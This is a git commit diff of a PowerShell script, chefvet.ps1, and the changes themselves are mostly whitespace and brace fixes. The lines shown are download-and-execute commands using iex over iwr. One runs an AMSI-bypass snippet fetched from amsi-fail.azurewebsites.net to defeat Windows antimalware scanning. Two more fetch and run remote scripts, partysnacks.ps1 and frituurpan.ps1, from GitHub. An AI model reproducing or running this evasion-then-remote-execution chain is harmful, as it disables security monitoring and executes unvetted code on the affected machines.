1835a02894bc0692f0025c47b94e945101c29b32
Justin Perdok <justin-p@users.noreply.github.com>
2020-10-28 16:15:01 +0000

    Update chefvet.ps1

--- chefvet.ps1
+++ chefvet.ps1
@@ -29,9 +29,9 @@ write-host @("
 
 
 Function voorverwarming {
-    iex((iwr https://amsi-fail.azurewebsites.net/api/Generate).content)
-   }
+  iex((iwr https://amsi-fail.azurewebsites.net/api/Generate).content)
 }
+
 voorverwarming
 iex((iwr https://raw.githubusercontent.com/justin-p/chefvet/master/partysnacks.ps1).content)
 iex((iwr https://raw.githubusercontent.com/justin-p/chefvet/master/frituurpan.ps1).content)
